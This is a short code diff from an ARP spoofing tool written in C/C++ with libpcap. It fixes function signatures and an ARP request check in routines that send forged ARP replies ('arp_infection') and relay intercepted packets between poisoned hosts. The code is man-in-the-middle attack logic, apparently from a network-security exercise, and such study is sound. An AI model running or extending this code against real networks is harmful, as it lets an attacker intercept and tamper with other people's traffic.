@@ -69,14 +69,14 @@ void send_pkt(uint8_t * d_mac, uint8_t * s_mac, uint8_t * f_mac, uint8_t * d_ip,
 	}
 }
 		
-void get_sender_mac(uint8_t * sender_mac, uint8_t * sender_ip) {
+void get_mac(uint8_t * sender_mac, uint8_t * sender_ip) {
 	struct pcap_pkthdr * header;
 	struct ether_header * ethernet;
 	struct arp_header * arp;
 	const u_char * packet;
 	uint8_t tmp_mac[6] = {static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff)};
 	uint8_t tmp1_mac[6] = {0};
-	send_pkt(tmp_mac, my_mac, tmp1_mac, sender_ip, my_ip, static_cast<uint16_t>(0x0100), fp);
+	send_pkt(tmp_mac, my_mac, tmp1_mac, sender_ip, my_ip, static_cast<uint16_t>(0x0100));
 	while (true) {
 		int i, res = pcap_next_ex(fp, &header, &packet);
 		if (res == 0) continue;
@@ -90,10 +90,10 @@ void get_sender_mac(uint8_t * sender_mac, uint8_t * sender_ip) {
 }
 
 void arp_infection(session s) {
-	send_pkt(ip2mac[s.sender_ip], my_mac, ip2mac[s.sender_ip], s.target_ip, static_cast<uint16_t>(0x0200), fp);
+	send_pkt(ip2mac[s.sender_ip], my_mac, ip2mac[s.sender_ip], (uint8_t *)&s.sender_ip, (uint8_t *)&s.target_ip, static_cast<uint16_t>(0x0200));
 }
 
-void pkt_relay_recover(unsigned char *param,const struct pcap_pkthdr *header,const unsigned char *pkt_data)
+void pkt_relay_recover(unsigned char *param, const struct pcap_pkthdr *header,const unsigned char *pkt_data)
 {
   struct ether_header * ethernet = (struct ether_header *)pkt_data;
   for(int i = 0; i < session_cnt; i++) {
@@ -104,8 +104,9 @@ void pkt_relay_recover(unsigned char *param,const struct pcap_pkthdr *header,con
 			}
 			else if(ethernet -> ether_type == htons(0x0806)) {
 				struct arp_header * arp = (struct arp_header *)(pkt_data + 14);
-				if((arp -> op == htons(0x0001)) && (!memcmp(arp -> tpa), (uint8_t*)&ip_vector[i].target_ip, 4)))
+				if((arp -> arp_op == htons(0x0001)) && (!memcmp(arp -> arp_tpa, (uint8_t*)&ip_vector[i].target_ip, 4))) {
 					arp_infection(ip_vector[i]);
+				}
 			}
 			break;
 		} 
